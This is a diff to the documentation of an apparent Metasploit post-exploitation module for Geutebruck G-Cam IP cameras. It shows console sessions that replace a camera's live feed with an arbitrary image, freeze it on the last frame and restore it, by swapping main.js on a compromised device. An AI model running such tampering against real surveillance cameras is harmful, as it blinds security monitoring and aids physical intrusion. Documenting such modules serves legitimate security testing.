@@ -70,24 +70,13 @@ blogpost page at https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilit
 ### Geutebruck 5.02024 G-Cam EFD-2250 running firmware version 1.12.0.27.
 ```
 msf6 > use post/linux/manage/geutebruck_post_exp
-msf6 post(linux/manage/geutebruck_post_exp) > show actions
-
-Post actions:
-
-   Name           Description
-   ----           -----------
-   CHANGE_IMAGE   It replaces the video stream by an arbitrary image
-   FREEZE_CAMERA  It freezes the last image from the video stream
-   RESUME_STREAM  It resumes the video stream back to a normal state
-
-
 msf6 post(linux/manage/geutebruck_post_exp) > show options
 
 Module options (post/linux/manage/geutebruck_post_exp):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
-   IMAGE                     no        Local image path to upload
+   IMAGE                     no        Full path to the local copy of the image to upload
    SESSION                   yes       The session to run this module on.
 
 
@@ -95,8 +84,18 @@ Post action:
 
    Name           Description
    ----           -----------
-   FREEZE_CAMERA  It freezes the last image from the video stream
+   FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream
 
+
+msf6 post(linux/manage/geutebruck_post_exp) > show actions
+
+Post actions:
+
+   Name           Description
+   ----           -----------
+   CHANGE_IMAGE   Display an arbitrary image instead of the video stream
+   FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream
+   RESUME_STREAM  Resume the camera's video stream and display the current live feed
 
 msf6 post(linux/manage/geutebruck_post_exp) > set IMAGE /var/randori.jpg
 IMAGE => /var/randori.jpg
@@ -119,8 +118,8 @@ msf6 post(linux/manage/geutebruck_post_exp) > run
 
 [!] SESSION may not be compatible with this module.
 [*] -- Starting action --
-[*] Taking a snapshot...
-[*] Freezing the stream...
+[*] Taking a snapshot of the current stream to use as the static image to freeze the stream on...
+[*] Freezing the stream on the captured image...
 [*] Backing up the original main.js...
 [*] Using the new main.js...
 [*] Stream frozen!
@@ -131,6 +130,7 @@ msf6 post(linux/manage/geutebruck_post_exp) > run
 
 [!] SESSION may not be compatible with this module.
 [*] -- Starting action --
+[*] Restoring image.fcgi...
 [*] Restoring main.js backup...
 [*] Restored! Stream back to a normal state.
 [*] Post module execution completed
